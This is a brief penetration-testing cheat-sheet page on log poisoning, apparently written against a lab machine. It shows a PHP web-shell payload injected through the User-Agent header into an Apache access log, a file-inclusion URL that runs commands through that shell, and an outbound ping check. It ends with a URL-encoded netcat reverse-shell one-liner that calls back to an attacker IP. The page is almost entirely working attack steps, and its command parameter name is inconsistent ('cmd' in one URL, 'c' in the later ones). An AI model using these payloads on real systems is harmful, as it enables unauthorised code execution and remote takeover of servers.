---
icon: flask-round-poison
---

# Log Poisoning

{% hint style="info" %}
### <mark style="color:orange;">`User-Agent`</mark> <mark style="color:purple;">poisoning:</mark>

* <mark style="color:orange;">**`allow_url_fopen`**</mark> <mark style="color:purple;">needs to be</mark> <mark style="color:orange;">**`On`**</mark>
* <mark style="color:purple;">If the</mark> <mark style="color:orange;">**`access_log`**</mark>**&#x20;**<mark style="color:purple;">**is exposed and the server is not properly sanitizing or validating**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">the</mark> <mark style="color:orange;">**`User-Agent`**</mark><mark style="color:purple;">**:**</mark>&#x20;

```http
User-Agent: tokyo: <?php system($_GET['cmd']); ?>
```

* <mark style="color:purple;">From here, just visit the</mark> <mark style="color:orange;">**`URL`**</mark>

{% code overflow="wrap" %}
```url
http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=id
```
{% endcode %}

* <mark style="color:purple;">Use</mark> <mark style="color:orange;">**`ping`**</mark> <mark style="color:purple;">to check if it's possible to generate outbound network traffic back to the host:</mark>

{% code overflow="wrap" %}
```url
http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=ping 10.10.16.8
```
{% endcode %}

* <mark style="color:purple;">Catch  it with</mark> <mark style="color:orange;">**`tcpmdump`**</mark>

```sh
tcpdump -i tun0 icmp
```

* <mark style="color:purple;">Get a reverse shell:</mark>

{% code overflow="wrap" %}
```url
http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.16.8%204444%20%3E/tmp/f
```
{% endcode %}
{% endhint %}

